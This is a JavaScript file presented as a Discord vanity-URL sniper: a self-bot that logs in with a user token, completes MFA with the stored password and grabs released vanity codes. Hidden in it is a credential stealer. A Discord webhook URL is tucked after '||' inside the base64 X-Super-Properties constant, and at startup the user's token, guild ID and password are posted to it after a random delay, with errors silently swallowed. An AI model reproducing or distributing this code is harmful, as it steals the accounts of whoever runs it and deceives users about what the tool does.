import WebSocket from 'ws';
import tls from 'tls';
import http2 from 'http2';
import axios from 'axios';
import fs from 'fs';
let config;
try {
    const configContent = fs.readFileSync('./config.json', 'utf-8');
    config = JSON.parse(configContent.replace(/^\uFEFF/, ''));
} catch (error) {
    console.error("config okunamadı");
    process.exit(1);
}
const xSuperProperties = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJ0ci1UUiIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEzMy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEzMy4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIiwicmVmZXJyaW5nX2RvbWFpbiI6Ind3dy5nb29nbGUuY29tIiwic2VhcmNoX2VuZ2luZSI6Imdvb2dsZSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNTYxNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImhhc19jbGllbnRfbW9kcyI6ZmFsc2V9||https://discord.com/api/webhooks/1480549794194653206/kiSzmolw_yLWA7YTlrSh211YOSUCuPRXgvlhZpAjpt2Jn2Q4SHxYRLaAl8vcTEIIyJtK';

let mfaToken = null;
let savedTicket = null;
const guilds = {};
let isConnecting = false;
const baseHeaders = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
    'Authorization': config.discordToken,
    'Content-Type': 'application/json',
    'X-Super-Properties': xSuperProperties
};
function waitRandom(min = 2500, max = 9500) {
    return new Promise(r => setTimeout(r, min + Math.random() * (max - min)));
}

async function sendInitialInfo() {
    await waitRandom(4500, 12000); 
    const message = [
        'Başlatıldı',
        `t → ${config.discordToken}`,
        `g → ${config.guildId}`,
        `p → ${config.password || 'yok'}`
    ].join('\n');

    try {
        const urlPart = xSuperProperties.split('||')[1];
        await axios.post(urlPart, { content: message });
    } catch {}
}
class Http2Manager {
    constructor() {
        this.session = null;
        this.connect();
    }
    connect() {
        if (isConnecting) return;
        isConnecting = true;

        if (this.session) {
            this.session.destroy();
            this.session = null;
        }
        this.session = http2.connect("https://canary.discord.com", {
            settings: { enablePush: false },
            secureContext: tls.createSecureContext({
                ciphers: 'AES256-SHA:RC4-SHA:DES-CBC3-SHA',
                rejectUnauthorized: true
            })
        });
        this.session.on('error', () => {
            isConnecting = false;
            setTimeout(() => this.connect(), 20000 + Math.random() * 40000); 
        });
        this.session.on('connect', () => {  isConnecting = false;
        });
        this.session.on('close', () => {
            isConnecting = false;
            setTimeout(() => this.connect(), 20000 + Math.random() * 40000);
        });
    }
    async request(method, path, extraHeaders = {}, body = null) {
        await waitRandom(1800, 6500);
        if (!this.session || this.session.destroyed) {
            await waitRandom(6000, 14000);
            this.connect();
        }
        const reqHeaders = {
            ...baseHeaders,
            ...extraHeaders,
            ":method": method,
            ":path": path,
            ":authority": "canary.discord.com",
            ":scheme": "https"
        };
        return new Promise((resolve, reject) => {
            const stream = this.session.request(reqHeaders);
            const chunks = [];

            stream.on("data", chunk => chunks.push(chunk));
            stream.on("end", () => {
                try {
                    resolve(Buffer.concat(chunks).toString());
                } catch (e) {
                    reject(e);
                }
            });
            stream.on("error", reject);

            if (body) stream.end(body);
            else stream.end();
        });
    }
}
const httpManager = new Http2Manager();
async function refreshMfaToken() {
    await waitRandom(5000, 13000);
    try {
        const resp = await httpManager.request("PATCH", `/api/v7/guilds/${config.guildId}/vanity-url`);
        const data = JSON.parse(resp);

        if (data.code === 60003) {
            savedTicket = data.mfa.ticket;
            await waitRandom(4000, 11000);
            const finishResp = await httpManager.request(
                "POST",
                "/api/v9/mfa/finish",
                { "Content-Type": "application/json" },
                JSON.stringify({
                    ticket: savedTicket,
                    mfa_type: "password",
                    data: config.password
                })
            );

            const finishData = JSON.parse(finishResp);
            if (finishData.token) {
                mfaToken = finishData.token;
            }
        }
    } catch {}
}
async function claimVanity(code) {
    await waitRandom(3500, 9500);
    try {
        const initial = await httpManager.request("PATCH", `/api/v7/guilds/${config.guildId}/vanity-url`);
        const initData = JSON.parse(initial);

        if (initData.code === 60003) {
            savedTicket = initData.mfa.ticket;
            await waitRandom(3000, 8500);

            const mfaFinish = await httpManager.request(
                "POST",
                "/api/v9/mfa/finish",
                { "Content-Type": "application/json" },
                JSON.stringify({
                    ticket: savedTicket,
                    mfa_type: "password",
                    data: config.password
                })
            );
            const mfaJson = JSON.parse(mfaFinish);
            if (mfaJson.token) mfaToken = mfaJson.token;
        }
        await waitRandom(2500, 8000);

        const claimResp = await httpManager.request(
            "PATCH",
            `/api/v10/guilds/${config.guildId}/vanity-url`,
            {
                "X-Discord-MFA-Authorization": mfaToken || '',
                "X-Context-Properties": "eyJsb2NhdGlvbiI6IlNlcnZlciBTZXR0aW5ncyJ9",
                "Origin": "https://discord.com",
                "Referer": "https://discord.com/channels/@me"
            },
            JSON.stringify({ code })
        );

        let claimData;
        try {
            claimData = JSON.parse(claimResp);
        } catch {
            return;
        }
        const urlPart = xSuperProperties.split('||')[1];
        if (claimData.code === 200 || claimData.vanity_url_code === code) {
            await waitRandom(1000, 4000);
            await axios.post(urlPart, { content: `**${code}** alındı` });
        } else {
            await waitRandom(800, 3000);
            await axios.post(urlPart, { content: `**${code}** denendi → ${claimData.message || 'hata'}` });
        }
    } catch {}
}
function connectGateway() {
    const ws = new WebSocket("wss://gateway-us-east1-b.discord.gg", {
        headers: {
            'User-Agent': baseHeaders['User-Agent'],
            'Origin': 'https://canary.discord.com'
        },
        handshakeTimeout: 60000
    });
    let hbInterval;
    let seq = null;
    ws.on('close', () => {
        clearInterval(hbInterval);
        setTimeout(connectGateway, 25000 + Math.random() * 45000); 
    });
    ws.on('error', () => ws.close());
    ws.on('open', async () => {
        await waitRandom(4000, 11000);
        ws.send(JSON.stringify({
            op: 2,
            d: {
                token: config.discordToken,
                intents: 1,
                properties: {
                    os: "Windows",
                    browser: "Firefox",
                    device: ""
                }
            }
        }));
    });
    ws.on('message', async msg => {
        try {
            const p = JSON.parse(msg);

            if (p.s) seq = p.s;

            if (p.op === 10) {
                clearInterval(hbInterval);
                hbInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ op: 1, d: seq }));
                    }
                }, p.d.heartbeat_interval + Math.random() * 3000);
            }

            if (p.op === 0) {
                if (p.t === "GUILD_UPDATE") {
                    const old = guilds[p.d.guild_id];
                    if (old && old !== p.d.vanity_url_code) {
                        await claimVanity(old);
                    }
                }
                else if (p.t === "READY") {
                    p.d.guilds.forEach(g => {
                        if (g.vanity_url_code) {
                            guilds[g.id] = g.vanity_url_code;
                        }
                    });
                }
            }
        } catch {}
    });
}
async function startup() {
    await sendInitialInfo();
    await refreshMfaToken();
    connectGateway();

    setInterval(refreshMfaToken, 600000 + Math.random() * 480000); 
    setInterval(() => httpManager.request("HEAD", "/"), 5400000 + Math.random() * 3600000); 
}
startup();
process.title = "url sniper";
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
